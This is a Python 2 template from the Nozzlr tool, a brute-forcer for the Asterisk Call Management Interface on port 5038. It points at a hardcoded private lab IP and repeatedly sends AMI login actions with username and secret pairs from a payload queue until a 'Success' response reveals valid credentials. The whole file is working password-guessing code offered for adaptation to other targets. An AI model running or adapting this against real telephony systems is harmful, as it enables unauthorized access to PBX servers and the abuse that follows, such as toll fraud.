## Nozzlr template : RAW Asterisk Call Management bruteforcer (port 5038) 
# @author intrd - http://dann.com.br/ 
# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/

# Make a copy of this template and adapt to your task!

import sys, time
sys.path.append("libs/")
from int_netcat import Netcat

def nozz_module(payload,self=False, founds=False):
	payloads=':'.join(str(v) for v in payload.values())

	## Configs
	user = payload[0]
	password = payload[1]
	hostt="10.10.10.7"
	portt=5038
	timeeou=5
	tries_per_session=3 

	## Engine
	out={}
	out["code"]=""
	out["result"]=""
	try:
		nc = Netcat(hostt, portt, timeeou)
		data=nc.read()
		print data
		#exit()
	except Exception as e:
		out["result"]="error: connection timeout"
		out["code"]=format(str(e)).strip()
		return out
	out["result"]+=" "+data.strip()
	fresh=True
	for i in range(tries_per_session):
		if not fresh:
			if self.queue.empty() is True:
				code="EOF"
				nc.close()
				out["code"]=code
				return out
			else:
				self.clear=self.queue.get()
			payload = self.clear
			ind = str(payload["id"])
			payload = payload["payloads"]
			payloads=':'.join(str(v) for v in payload.values())
			out["result"]+=(" <"+ind+"> '"+payloads+"'")
			user = payload[0]
			#user = "admin"
			password = payload[1]
			#password = "123123"
		nc.write("action: login\r\nusername: "+user+"\r\nsecret: "+password+"\r\n\r\n")
		try:
			data=nc.read()
		except Exception as e: 
			code="error: sending passwd"
			out["code"]=code
			return out
		out["result"]+=" "+data.strip()
		if "Success" in data:
			code="found: \""+payloads+"\""
			nc.close()
			out["code"]=code
			return out
		if "Response: Error" not in data:
			code="error: unknown error"
			out["code"]=code
			return out
		fresh=False
	nc.close()
	code="NEXT"
	out["code"]=code
	return out
	
		